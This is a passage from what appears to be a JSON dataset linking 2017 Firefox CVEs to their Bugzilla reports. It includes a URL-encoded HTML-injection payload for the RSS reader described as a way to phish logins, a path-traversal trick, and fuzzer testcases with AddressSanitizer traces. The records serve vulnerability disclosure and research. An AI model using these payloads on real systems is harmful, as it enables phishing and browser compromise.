    ],
    "CVE-2017-5453": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1321247",
        "title": "HTML Injection into RSS reader",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36 Steps to reproduce: Subscribe to an RSS news feed from a website in Firefox. In certain circumstances, it is possible to inject html code by modifying the normal behavior of the RSS reader. Original source: https://arxiv.org/help/api/index Actual example: http://export.arxiv.org/api/query?search_query=algorithms Example that prompts the user to Share on Facebook (you can redirect to a login impersonation page) http://export.arxiv.org/api/query?start=1&max_results=50&id_token=4478b9e6-d3b5-4d71-bbb4-9979a2161122-873652752266-q5rsvcuumuk3hmstnmvkmq69oucaf7q3&search_query=algorithms%3Cform%20action=%22https://arxiv.org/find/all/1/all:+cela/0/1/0/all/0/1%22%20target=%22_blank%22%20onsubmit=%22alert(1)%22%3E%3Cinput%20type=%22image%22%20align=%22right%22%20valign=%22top%22%20width=%22200%22%20margin=%220%22%20padding=%220%22%20src=%22https://www.cabq.gov/culturalservices/biopark/images/share-on-facebook.png%22%20/%3E%3C/form%3E Example using proper html elements of the page by adding more real content (you can redirect to a phising page) http://export.arxiv.org/api/query?start=1&max_results=50&id_token=4478b9e6-d3b5-4d71-bbb4-9979a2161122-873652752266-q5rsvcuumuk3hmstnmvkmq69oucaf7q3&search_query=algorithms%3Cdiv%20id=%22feedHeaderContainer1%22%3E%3Cdiv%20id=%22feedHeaderContainer%22%3E%3Cform%20action=%22https://www.mozilla.com%22%20target=%22_blank%22%20onsubmit=%22alert(1)%22%3E%20%3Cdiv%20id=%22feedSubscribeLine%22%3E%3Cfont%20size=-1%3EPuedes%20cambiar%20la%20configuraci%C3%B3n%20para%20que%20la%20barra%20de%20marcadores%20aparezca%20en%20todas%20las%20p%C3%A1ginas.%3C/font%3E%3Cbutton%20align=%22right%22%3EVer%20tus%20marcadores%3C/button%3E%3Cp%3E&nbsp;%3C/p%3E%3C/form%3E Another example that could recover the user and password of an email account: http://export.arxiv.org/api/query?start=1&max_results=50&id_token=4478b9e6-d3b5-4d71-bbb4-9979a2161122-873652752266-q5rsvcuumuk3hmstnmvkmq69oucaf7q3&search_query=algorithms%3Cdiv%20id=%22feedHeaderContainer1%22%3E%3Cdiv%20id=%22feedHeaderContainer%22%3E%3Cform%20action=%22https://www.mozilla.com%22%20target=%22_blank%22%20onsubmit=%22alert(1)%22%3E%20%3Cdiv%20id=%22feedSubscribeLine%22%3E%3Cfont%20size=-1%3EPuedes%20cambiar%20la%20configuraci%C3%B3n%20para%20que%20la%20barra%20de%20marcadores%20aparezca%20en%20todas%20las%20p%C3%A1ginas.%3C/font%3E%3Cbutton%20align=%22right%22%3EVer%20tus%20marcadores%3C/button%3E%3Cp%3E&nbsp;%3C/p%3E%3C/form%3E (the id_token parameter is dummy and is used to hide the html code of the page) With more imagination could get impressive results. Actual results: It is possible to inject html code by modifying the normal behavior of the RSS reader. Expected results: The rss manager should escape the characters sent as url parameters"
      }
    ],
    "CVE-2017-5454": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1349276",
        "title": "Paths received by FileSystemRequestParent need to be sanitized before passed to IsDescendantPath",
        "description": "Per discussion with :baku on IRC, this is a follow up to bug 1344415 \"Privilege escalation/Sandbox escape using PFileSystemRequestConstructor\". The fix for 1344415 needs to do some additional checks on the paths received from content and used in FileSystemRequestParent::Initialize() before they are passed to FileSystemUtils::IsDescendantPath() to prevent the \"..\" trick. Specifically, in the parent, the file picker could be used to select say /Users/john/files-to-upload The child could later send a FileSystemRequestParent request for the path /Users/john/files-to-upload/../my-secret-files And FileSystemUtils::IsDescendantPath would consider the second path to be a descendant of the first which would allow the content process to access files that it should not be allowed to. The content process sandbox will soon block read access to arbitrary files in the home directory."
      }
    ],
    "CVE-2017-5458": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1229426",
        "title": "\"javascript:\" scheme not removed for drag and drop, unlike pasting into the URL bar",
        "description": "As an anti-self-XSS feature (where people are lured into hacking themselves, typically their social media accounts) we remove the javascript: scheme when people paste URLs into the Location bar. We should be doing the same for drag and drop, which is also used for the same kinds of self-xss attacks. At least we don't execute the javascript: url when dropped so it's not terrible, but it leaves the victim one innocuous-sounding instruction ('hit return') away from the same result."
      }
    ],
    "CVE-2017-5459": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1333858",
        "title": "SEGV in AddressIsPoisoned",
        "description": "I have no idea if this bug actually has security impact, but marking as security issue just to be sure. Also feel free to fill in better summary. :) Tested on: OS: Ubuntu 16.04 Firefox: ASAN build from https://index.taskcluster.net/v1/task/gecko.v2.mozilla-central.latest.firefox.linux64-asan-opt/artifacts/public/build/target.tar.bz2 sourcestamp: c989c7b352279925edf138373e4ca3f1540dbd5f ASAN-trace: ================================================================= ==29577==ERROR: AddressSanitizer: SEGV on unknown address 0x10301b08743e (pc 0x00000049c268 bp 0x7ffecf6b6a40 sp 0x7ffecf6b61e0 T0) #0 0x49c267 in AddressIsPoisoned /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_mapping.h:297:29 #1 0x49c267 in QuickCheckForUnpoisonedRegion /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:42 #2 0x49c267 in memcpy /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:438 #3 0x7efcdf670ee2 (/usr/lib/x86_64-linux-gnu/dri/i965_dri.so+0x3beee2) #4 0x7efcdf671822 (/usr/lib/x86_64-linux-gnu/dri/i965_dri.so+0x3bf822) #5 0x7efcdf66bb1a (/usr/lib/x86_64-linux-gnu/dri/i965_dri.so+0x3b9b1a) #6 0x7efcdf3df87e in _init (/usr/lib/x86_64-linux-gnu/dri/i965_dri.so+0x12d87e) #7 0x7efcdf3dfa01 in _init (/usr/lib/x86_64-linux-gnu/dri/i965_dri.so+0x12da01) #8 0x7efd07655dcc in raw_fReadPixels /home/worker/workspace/build/src/obj-firefox/dist/include/GLContext.h:1553:9 #9 0x7efd07655dcc in mozilla::gl::GLContext::fReadPixels(int, int, int, int, unsigned int, unsigned int, void*) /home/worker/workspace/build/src/gfx/gl/GLContext.cpp:2881 #10 0x7efd09e3eea0 in mozilla::WebGLContext::DoReadPixelsAndConvert(mozilla::webgl::FormatInfo const*, int, int, int, int, unsigned int, unsigned int, void*, unsigned int, unsigned int) /home/worker/workspace/build/src/dom/canvas/WebGLContextGL.cpp:1176:9 #11 0x7efd09e3fede in mozilla::WebGLContext::ReadPixelsImpl(int, int, int, int, unsigned int, unsigned int, void*, unsigned int) /home/worker/workspace/build/src/dom/canvas/WebGLContextGL.cpp:1568:9 #12 0x7efd09e3f64f in mozilla::WebGLContext::ReadPixels(int, int, int, int, unsigned int, unsigned int, mozilla::dom::ArrayBufferView_base<&js::UnwrapArrayBufferView, &js::GetArrayBufferViewLengthAndData, &(JS_GetArrayBufferViewType(JSObject*))> const&, unsigned int, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/canvas/WebGLContextGL.cpp:1343:5 #13 0x7efd093a49e1 in ReadPixels /home/worker/workspace/build/src/dom/canvas/WebGLContext.h:690:9 #14 0x7efd093a49e1 in mozilla::dom::WebGLRenderingContextBinding::readPixels(JSContext*, JS::Handle<JSObject*>, mozilla::WebGLContext*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WebGLRenderingContextBinding.cpp:11943 #15 0x7efd09c5c0c0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2914:13 #16 0x7efd0f6a96cc in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #17 0x7efd0f6a96cc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) . . . Note: if I lower the value of second argument in: \"gl.readPixels(0, 2147483647, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(4));\" instead of crash I get a warning: \"JavaScript warning: file:///tmp/repro-file.html, line 5: Error: WebGL warning: readPixels: Out-of-bounds reads with readPixels are deprecated, and may be slow.\""
      }
    ],
    "CVE-2017-5460": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1343642",
        "title": "heap-use-after-free in nsFrameSelection::PhysicalMove",
        "description": "The following testcases crashes the latest ASAN build of Firefox. The testcase requires the fuzzPriv extension. <script> function start() { o0=document.createElement('iframe'); document.body.appendChild(o0); setTimeout(fun1, 400); } function fun1() { o11=o0.contentDocument.documentElement; o20=document.createElement('textarea'); o11.appendChild(o20); o20.focus(); o0.contentWindow.onresize=fun2; o0.width='12px'; fuzzPriv.trustedKeyEvent(document.documentElement,'press',false,false,true,false,38,0); } function fun2() { window.top.document.documentElement.appendChild(o0); window.fuzzPriv.CC(); window.fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==27885==ERROR: AddressSanitizer: heap-use-after-free on address 0x61100030a6b8 at pc 0x7f5ea6a40572 bp 0x7ffec9152090 sp 0x7ffec9152088 READ of size 8 at 0x61100030a6b8 thread T0 (Web Content) #0 0x7f5ea6a40571 in nsFrameSelection::PhysicalMove(short, short, bool) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:2224:8 #1 0x7f5ea5ffe950 in mozilla::SelectionMoveCommands::DoCommand(char const*, nsISupports*) /home/worker/workspace/build/src/editor/libeditor/EditorCommands.cpp:906:14 #2 0x7f5ea4352016 in nsControllerCommandTable::DoCommand(char const*, nsISupports*) /home/worker/workspace/build/src/dom/commandhandler/nsControllerCommandTable.cpp:147:10 #3 0x7f5ea43489da in nsBaseCommandController::DoCommand(char const*) /home/worker/workspace/build/src/dom/commandhandler/nsBaseCommandController.cpp:136:10 #4 0x7f5ea5a387f8 in nsXBLPrototypeHandler::DispatchXBLCommand(mozilla::dom::EventTarget*, nsIDOMEvent*) /home/worker/workspace/build/src/dom/xbl/nsXBLPrototypeHandler.cpp:498:5 #5 0x7f5ea5a0f40f in nsXBLPrototypeHandler::ExecuteHandler(mozilla::dom::EventTarget*, nsIDOMEvent*) /home/worker/workspace/build/src/dom/xbl/nsXBLPrototypeHandler.cpp:221:12 #6 0x7f5ea5a55418 in nsXBLWindowKeyHandler::WalkHandlersAndExecute(nsIDOMKeyEvent*, nsIAtom*, nsXBLPrototypeHandler*, unsigned int, mozilla::dom::IgnoreModifierState const&, bool, bool*) /home/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:755:19 #7 0x7f5ea5a4f9eb in nsXBLWindowKeyHandler::WalkHandlersInternal(nsIDOMKeyEvent*, nsIAtom*, nsXBLPrototypeHandler*, bool, bool*) /home/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:618:12 #8 0x7f5ea5a4f3a7 in nsXBLWindowKeyHandler::WalkHandlers(nsIDOMKeyEvent*, nsIAtom*) /home/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:298:3 #9 0x7f5ea5a53b55 in nsXBLWindowKeyHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:477:10 #10 0x7f5ea44b0c69 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1123:16 #11 0x7f5ea44b2c10 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 #12 0x7f5ea449d72d in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:489:9 #13 0x7f5ea449db34 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:518:5 #14 0x7f5ea44a0ca4 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #15 0x7f5ea44a2fe7 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:891:12 #16 0x7f5ea27a8ca1 in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1331:5 #17 0x7f5ea44be014 in mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/events/EventTarget.cpp:73:9 #18 0x7f5ea3c31a72 in mozilla::dom::EventTargetBinding::dispatchEvent(JSContext*, JS::Handle<JSObject*>, mozilla::dom::EventTarget*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:974:15 #19 0x7f5ea3c2ea6f in mozilla::dom::EventTargetBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:1150:13 #20 0x7f5ea9b5491f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #21 0x7f5ea9b5491f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #22 0x7f5ea9b3b996 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #23 0x7f5ea9b3b996 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2944 #24 0x7f5ea9b20a7b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #25 0x7f5ea9b54c36 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #26 0x7f5ea9b55312 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #27 0x7f5eaa5233d3 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2819:12 #28 0x7f5ea13de6e9 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #29 0x7f5ea9b5491f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #30 0x7f5ea9b5491f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #31 0x7f5ea9b3b996 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #32 0x7f5ea9b3b996 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2944 #33 0x7f5ea9b20a7b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #34 0x7f5ea9b54c36 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #35 0x7f5ea9b55312 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #36 0x7f5eaa52518c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2878:12 #37 0x7f5ea3c83d69 in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8 #38 0x7f5ea23e96b5 in Call<nsCOMPtr<nsISupports> > /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:72:12 #39 0x7f5ea23e96b5 in nsGlobalWindow::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:12956 #40 0x7f5ea25a5310 in mozilla::dom::TimeoutManager::RunTimeout(mozilla::dom::Timeout*) /home/worker/workspace/build/src/dom/base/TimeoutManager.cpp:584:34 #41 0x7f5ea25a052d in mozilla::dom::(anonymous namespace)::TimerCallback(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/Timeout.cpp:65:3 #42 0x7f5e9fcb97eb in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:479:7 #43 0x7f5e9fc8877c in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:297:3 #44 0x7f5e9fc9a522 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:200:15 #45 0x7f5e9fc99e5f in mozilla::ThrottledEventQueue::Inner::Executor::Run() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:74:7 #46 0x7f5e9fc77802 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:257:21 #47 0x7f5e9fcab452 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #48 0x7f5e9fca7d00 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #49 0x7f5ea0ac66f4 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:124:5 #50 0x7f5ea0a37a98 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #51 0x7f5ea0a37a98 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #52 0x7f5ea0a37a98 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #53 0x7f5ea5e8b53f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #54 0x7f5ea96e2d97 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:852:12 #55 0x7f5ea0a37a98 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #56 0x7f5ea0a37a98 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #57 0x7f5ea0a37a98 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #58 0x7f5ea96e287c in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:684:7 #59 0x4e01b6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #60 0x4e01b6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:287 #61 0x7f5ebb0b582f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #62 0x41c3d8 in _start (/home/nils/fuzzer3/firefox/firefox+0x41c3d8) 0x61100030a6b8 is located 184 bytes inside of 232-byte region [0x61100030a600,0x61100030a6e8) freed by thread T0 (Web Content) here: #0 0x4b2b2b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f5e9fb48644 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:9 #2 0x7f5e9fb48236 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3 #3 0x7f5e9fb4f516 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3825:3 #4 0x7f5e9fb4ecf0 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3650:9 #5 0x7f5e9fb51a8c in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4143:3 #6 0x7f5ea27c6f8f in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1451:3 #7 0x7f5ea231e0fd in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1339:3 #8 0x7f5e9fcc6971 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:115 #9 0x7f5ea149f987 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2010:12 #10 0x7f5ea149f987 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1329 #11 0x7f5ea149f987 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1296 #12 0x7f5ea14a72fb in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:983:12 #13 0x7f5ea9b5491f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #14 0x7f5ea9b5491f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #15 0x7f5ea9b3b996 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #16 0x7f5ea9b3b996 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2944 #17 0x7f5ea9b20a7b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #18 0x7f5ea9b54c36 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #19 0x7f5ea9b55312 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #20 0x7f5eaa5233d3 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2819:12 #21 0x7f5ea13de6e9 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7f5ea9b5491f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #23 0x7f5ea9b5491f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #24 0x7f5ea9b3b996 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #25 0x7f5ea9b3b996 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2944 #26 0x7f5ea9b20a7b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #27 0x7f5ea9b54c36 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #28 0x7f5ea9b55312 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #29 0x7f5eaa7c6ddc in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7f5eaa77d02e in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:351:14 #31 0x7f5eaa7a6899 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:12 #32 0x7f5eaa7a91c4 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #33 0x7f5ea9b549c7 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #34 0x7f5ea9b549c7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #35 0x7f5ea9b55312 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #36 0x7f5eaa52518c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2878:12 previously allocated by thread T0 (Web Content) here: #0 0x4b2e4b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e11bd in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f5ea491e780 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f5ea491e780 in nsTextEditorState::BindToFrame(nsTextControlFrame*) /home/worker/workspace/build/src/dom/html/nsTextEditorState.cpp:1170 #4 0x7f5ea6b4e6d4 in nsTextControlFrame::CreateAnonymousContent(nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/forms/nsTextControlFrame.cpp:332:17 #5 0x7f5ea66aa1e7 in nsCSSFrameConstructor::GetAnonymousContent(nsIContent*, nsIFrame*, nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4207:17 #6 0x7f5ea669e35d in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10909:3 #7 0x7f5ea66b327e in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4062:9 #8 0x7f5ea66be1f6 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6209:3 #9 0x7f5ea66cc5eb in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10705:5 #10 0x7f5ea66cc5eb in nsCSSFrameConstructor::ContentAppended(nsIContent*, nsIContent*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7564 #11 0x7f5ea66c6eb8 in nsCSSFrameConstructor::CreateNeededFrames(nsIContent*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7183:5 #12 0x7f5ea65db932 in mozilla::GeckoRestyleManager::ProcessPendingRestyles() /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:464:3 #13 0x7f5ea66272a0 in ProcessPendingRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerInlines.h:44:3 #14 0x7f5ea66272a0 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) 